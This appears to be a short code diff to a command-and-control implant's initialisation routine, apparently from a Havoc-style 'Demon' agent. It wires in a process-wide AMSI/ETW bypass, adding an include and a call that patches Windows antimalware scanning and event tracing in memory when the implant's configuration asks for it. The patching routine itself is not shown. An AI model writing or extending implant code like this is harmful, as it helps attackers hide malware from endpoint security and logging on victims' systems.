@@ -18,6 +18,9 @@
 /* Import Inject Headers */
 #include <core/ObjectApi.h>
 
+/* ARC-01: process-wide AMSI/ETW bypass */
+#include <core/AmsiEtwBypass.h>
+
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
 SEC_DATA BYTE      AgentConfig[] = CONFIG_BYTES;
@@ -488,6 +491,15 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
             PUTS( "Failed to load a module" )
             return;
+        }
+    }
+
+    /* ARC-01: apply persistent process-wide AMSI/ETW bypass when configured.
+     * In-memory patching covers every thread — present and future — without
+     * any per-thread hardware breakpoint registration. */
+    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
+        if ( ! NT_SUCCESS( AmsiEtwBypassPatch() ) ) {
+            PUTS( "[BYPASS] Warning: process-wide AMSI/ETW patch failed" )
         }
     }
 
